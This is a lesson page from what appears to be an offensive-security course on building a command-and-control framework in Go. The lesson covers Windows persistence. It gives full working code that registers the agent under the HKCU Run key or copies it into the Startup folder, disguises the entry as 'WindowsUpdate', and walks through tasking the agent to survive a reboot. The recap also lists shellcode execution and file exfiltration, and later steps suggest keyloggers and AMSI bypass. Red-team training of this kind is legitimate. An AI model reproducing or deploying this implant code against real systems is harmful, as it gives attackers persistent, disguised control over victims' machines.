---
layout: course01
title: "Lesson 23: Persistence"
---


## Solutions

- **Starting Code:** [lesson_23_begin](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_23_begin)
- **Completed Code:** [lesson_23_end](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_23_end)

## Overview

This is our final lesson - and the ultimate "wow" moment. We'll implement **persistence**, making our agent automatically start when Windows boots up.

After completing this lesson, you can:

1. Deploy your agent to a Windows machine
2. Queue the persistence command
3. Reboot the machine
4. Watch your agent automatically reconnect

This is what takes a proof-of-concept to a real operational capability.

We'll implement two persistence mechanisms:

- **Registry Run Key** (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- **Startup Folder** (as an alternative)

## What We'll Create

- `PersistArgsClient` and `PersistArgsAgent` types
- `validatePersistCommand` and `processPersistCommand` functions
- `orchestratePersist` on the agent
- `doPersist` with Windows-specific implementation
- Platform stubs for non-Windows systems

## Understanding Persistence Mechanisms

Before we code, let's understand Windows persistence options:

```
COMMON WINDOWS PERSISTENCE MECHANISMS

1. Registry Run Keys (What we'll implement)
   |-- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   |-- Runs at user login (no admin required)
   |-- Survives reboots

2. Startup Folder (Alternative we'll implement)
   |-- %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
   |-- Runs at user login
   |-- Easy to spot (visible in Explorer)

3. Scheduled Tasks (More complex)
   |-- Can run at boot, login, or schedule
   |-- Requires schtasks.exe or COM objects

4. Services (Requires admin)
   |-- Runs before user login
   |-- More stealthy but complex
```

We'll focus on Registry Run Keys as they're the most common and effective for user-level persistence.

## Part 1: Server-Side Implementation

### Create Argument Types

Add to `models/types.go`:

```go
// PersistArgsClient - what the client sends
type PersistArgsClient struct {
	Method   string `json:"method"`    // "registry" or "startup"
	Name     string `json:"name"`      // Name for the persistence entry
	Remove   bool   `json:"remove"`    // true to remove persistence, false to install
}

// PersistArgsAgent - what we send to the agent
type PersistArgsAgent struct {
	Method   string `json:"method"`
	Name     string `json:"name"`
	Remove   bool   `json:"remove"`
	AgentPath string `json:"agent_path"` // Path where agent executable is located
}

// PersistResult - what the agent sends back
type PersistResult struct {
	Method   string `json:"method"`
	Success  bool   `json:"success"`
	Message  string `json:"message"`
}
```

**Understanding the fields:**

- **Method** - Which persistence mechanism to use
- **Name** - Display name in registry/startup folder
- **Remove** - Allows removing persistence (cleanup)
- **AgentPath** - The agent needs to know its own location

### Create Validator and Processor

Create `internal/control/persist.go`:

```go
package control

import (
	"encoding/json"
	"fmt"
	"log"

	"your-module/internal/models"
)

// validatePersistCommand validates "persist" command arguments
func validatePersistCommand(rawArgs json.RawMessage) error {
	if len(rawArgs) == 0 {
		return fmt.Errorf("persist command requires arguments")
	}

	var args models.PersistArgsClient

	if err := json.Unmarshal(rawArgs, &args); err != nil {
		return fmt.Errorf("invalid argument format: %w", err)
	}

	// Validate method
	validMethods := map[string]bool{
		"registry": true,
		"startup":  true,
	}
	if !validMethods[args.Method] {
		return fmt.Errorf("invalid method '%s' (valid: registry, startup)", args.Method)
	}

	// Name is required
	if args.Name == "" {
		return fmt.Errorf("name is required")
	}

	log.Printf("Persist validation passed: method=%s, name=%s, remove=%v",
		args.Method, args.Name, args.Remove)
	return nil
}

// processPersistCommand processes persistence arguments
func processPersistCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
	var clientArgs models.PersistArgsClient

	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
		return nil, fmt.Errorf("unmarshaling args: %w", err)
	}

	// Pass through to agent - it knows its own executable path
	agentArgs := models.PersistArgsAgent{
		Method:    clientArgs.Method,
		Name:      clientArgs.Name,
		Remove:    clientArgs.Remove,
		AgentPath: "", // Agent will fill this in
	}

	processedJSON, err := json.Marshal(agentArgs)
	if err != nil {
		return nil, fmt.Errorf("marshaling processed args: %w", err)
	}

	action := "install"
	if clientArgs.Remove {
		action = "remove"
	}
	log.Printf("Persist processed: %s persistence via %s (name: %s)",
		action, clientArgs.Method, clientArgs.Name)
	return processedJSON, nil
}
```

### Register the Command

Add to `validCommands` in `control/command_api.go`:

```go
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"shellcode": {
		Validator: validateShellcodeCommand,
		Processor: processShellcodeCommand,
	},
	"download": {
		Validator: validateDownloadCommand,
		Processor: processDownloadCommand,
	},
	"persist": {  // NEW
		Validator: validatePersistCommand,
		Processor: processPersistCommand,
	},
}
```

## Part 2: Agent-Side Implementation

### Create the Orchestrator

Create `agent/persist.go`:

```go
package agent

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"

	"your-module/internal/control"
	"your-module/internal/models"
	"your-module/internal/server"
)

// orchestratePersist is the orchestrator for the "persist" command
func (agent *HTTPSAgent) orchestratePersist(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal arguments
	var persistArgs control.PersistArgsAgent
	if err := json.Unmarshal(job.Arguments, &persistArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal PersistArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR PERSIST ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to unmarshal PersistArgs"),
		}
	}

	action := "Installing"
	if persistArgs.Remove {
		action = "Removing"
	}
	log.Printf("|PERSIST ORCHESTRATOR| Task ID: %s. %s persistence via %s",
		job.JobID, action, persistArgs.Method)

	// Get our own executable path
	execPath, err := os.Executable()
	if err != nil {
		log.Printf("|ERR PERSIST ORCHESTRATOR| Failed to get executable path: %v", err)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to get executable path"),
		}
	}
	persistArgs.AgentPath = execPath

	// Call the OS-specific doer
	result := doPersist(persistArgs)

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR PERSIST ORCHESTRATOR| Persistence failed for TaskID %s: %s",
			job.JobID, result.Message)
		finalResult.Error = errors.New(result.Message)
		finalResult.Success = false
	} else {
		log.Printf("|PERSIST SUCCESS| %s for TaskID %s", result.Message, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}
```

**Getting the executable path:**

```go
execPath, err := os.Executable()
```

This is how the agent discovers its own location - critical for telling Windows what to run at startup.

### Create Windows Doer

Create `agent/persist_windows.go`:

```go
//go:build windows

package agent

import (
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
	"your-module/internal/models"
)

const (
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
)

// doPersist performs the persistence operation on Windows
func doPersist(args models.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: args.Method,
	}

	switch args.Method {
	case "registry":
		return doPersistRegistry(args)
	case "startup":
		return doPersistStartup(args)
	default:
		result.Success = false
		result.Message = fmt.Sprintf("unknown method: %s", args.Method)
		return result
	}
}

// doPersistRegistry handles Registry Run Key persistence
func doPersistRegistry(args models.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "registry",
	}

	// Open the Run key
	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to open registry key: %v", err)
		return result
	}
	defer key.Close()

	if args.Remove {
		// Remove the registry value
		err = key.DeleteValue(args.Name)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to delete registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed registry persistence '%s'", args.Name)
	} else {
		// Set the registry value to our executable path
		err = key.SetStringValue(args.Name, args.AgentPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to set registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Installed registry persistence '%s' -> %s", args.Name, args.AgentPath)
	}

	return result
}

// doPersistStartup handles Startup Folder persistence
func doPersistStartup(args models.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "startup",
	}

	// Get the Startup folder path
	appData := os.Getenv("APPDATA")
	if appData == "" {
		result.Success = false
		result.Message = "APPDATA environment variable not set"
		return result
	}
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Create shortcut filename
	shortcutPath := filepath.Join(startupPath, args.Name+".lnk")

	if args.Remove {
		// Remove the shortcut
		err := os.Remove(shortcutPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to remove shortcut: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed startup shortcut '%s'", args.Name)
	} else {
		// For simplicity, we'll copy the executable instead of creating a shortcut
		// Creating proper .lnk files requires COM or external tools
		copyPath := filepath.Join(startupPath, args.Name+".exe")

		// Read original file
		data, err := os.ReadFile(args.AgentPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to read agent: %v", err)
			return result
		}

		// Write to startup folder
		err = os.WriteFile(copyPath, data, 0755)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to copy to startup folder: %v", err)
			return result
		}

		result.Success = true
		result.Message = fmt.Sprintf("Copied agent to startup folder: %s", copyPath)
	}

	return result
}
```

### Breaking Down the Registry Persistence

**Open the Run key:**

```go
key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
```

We open `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` with permissions to read and write values.

**Set the value:**

```go
err = key.SetStringValue(args.Name, args.AgentPath)
```

This adds an entry like:
- Name: "WindowsUpdate" (or whatever the operator specified)
- Value: "C:\Users\victim\agent.exe"

Now when the user logs in, Windows will automatically run our agent!

### Create Non-Windows Stub

Create `agent/persist_other.go`:

```go
//go:build !windows

package agent

import (
	"fmt"

	"your-module/internal/models"
)

// doPersist stub for non-Windows systems
func doPersist(args models.PersistArgsAgent) models.PersistResult {
	return models.PersistResult{
		Method:  args.Method,
		Success: false,
		Message: fmt.Sprintf("Persistence not implemented for this platform (requested: %s)", args.Method),
	}
}
```

This allows the code to compile on macOS/Linux for development, even though persistence only works on Windows.

### Register the Orchestrator

Update `registerCommands()` in `agent/commands.go`:

```go
func registerCommands(agent *HTTPSAgent) {
	agent.commandOrchestrators["shellcode"] = (*HTTPSAgent).orchestrateShellcode
	agent.commandOrchestrators["download"] = (*HTTPSAgent).orchestrateDownload
	agent.commandOrchestrators["persist"] = (*HTTPSAgent).orchestratePersist  // NEW
}
```

## Test

This is the moment of truth! You'll need a Windows machine (or VM) for this test.

**Step 1: Cross-compile the agent for Windows**

```bash
GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
```

**Step 2: Transfer agent.exe to Windows machine**

Copy it to somewhere like `C:\Users\YourUser\agent.exe`

**Step 3: Start the server (on your Linux/Mac host)**

```bash
go run ./cmd/server
```

**Step 4: Run the agent on Windows**

```powershell
.\agent.exe
```

**Step 5: Queue the persistence command**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "persist",
    "data": {
      "method": "registry",
      "name": "WindowsUpdate",
      "remove": false
    }
  }'
```

**Expected server output:**

```bash
2025/11/08 15:30:22 Received command: persist
2025/11/08 15:30:22 Persist validation passed: method=registry, name=WindowsUpdate, remove=false
2025/11/08 15:30:22 Persist processed: install persistence via registry (name: WindowsUpdate)
2025/11/08 15:30:22 QUEUED: persist
2025/11/08 15:30:25 DEQUEUED: Command 'persist'
2025/11/08 15:30:25 Job (ID: job_789123) has succeeded
Message: Installed registry persistence 'WindowsUpdate' -> C:\Users\YourUser\agent.exe
```

**Step 6: Verify in Windows Registry**

Open `regedit.exe` and navigate to:
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`

You should see a new entry named "WindowsUpdate" pointing to your agent!

**Step 7: The magic moment - REBOOT**

Restart the Windows machine. After login, the agent should automatically start and connect back to your server!

```bash
# On your server, you should see:
2025/11/08 15:32:45 Endpoint / has been hit by agent
2025/11/08 15:32:45 No commands in queue
```

Your agent survived a reboot.

**Step 8: Remove persistence (cleanup)**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "persist",
    "data": {
      "method": "registry",
      "name": "WindowsUpdate",
      "remove": true
    }
  }'
```

## Course Recap

Congratulations! You've built a complete Command and Control framework:

```
WHAT YOU BUILT

Communication Layer:
|-- HTTPS encrypted channel
|-- DNS covert channel
|-- Dynamic protocol switching

Server Infrastructure:
|-- Command endpoint with validation
|-- Argument processing pipeline
|-- Command queue system
|-- Results receiver

Agent Architecture:
|-- Interface-based design
|-- Factory pattern for protocols
|-- Orchestrator/Doer separation
|-- Cross-platform build support

Commands Implemented:
|-- Shellcode - Reflective DLL loading
|-- Download - Exfiltrate files
|-- Persist - Survive reboots

Key Go Patterns Used:
|-- Interfaces and factory functions
|-- Method expressions
|-- Build tags for cross-platform
|-- Goroutines and channels
|-- json.RawMessage for flexibility
```

## Next Steps

This course gave you a foundation. Here are ideas for extending it:

1. **More commands:** Upload, screenshot, keylogger, process list
2. **Better persistence:** Scheduled tasks, services, WMI
3. **Encryption:** Add payload encryption over HTTPS
4. **Multi-agent:** Agent registration and tracking
5. **Web UI:** Replace curl with a proper operator interface
6. **Evasion:** Process injection, AMSI bypass, unhooking

The patterns you learned apply to all of these extensions.

## Conclusion

In this final lesson, we implemented persistence:

- Created argument types for the persist command
- Implemented server-side validation and processing
- Created Windows-specific Registry and Startup folder persistence
- Tested the complete flow including reboot survival
- Cleaned up with the remove option

You now have a fully functional C2 framework that can:
- Communicate over multiple protocols
- Switch protocols on demand
- Execute shellcode on Windows
- Download files from targets
- Persist through reboots

Thank you for completing this course!

---

[Previous: Lesson 22 - Download Command](/courses/course01/lesson-22) | [Next: Course Review](/courses/course01/review) | [Course Home](/courses/course01)
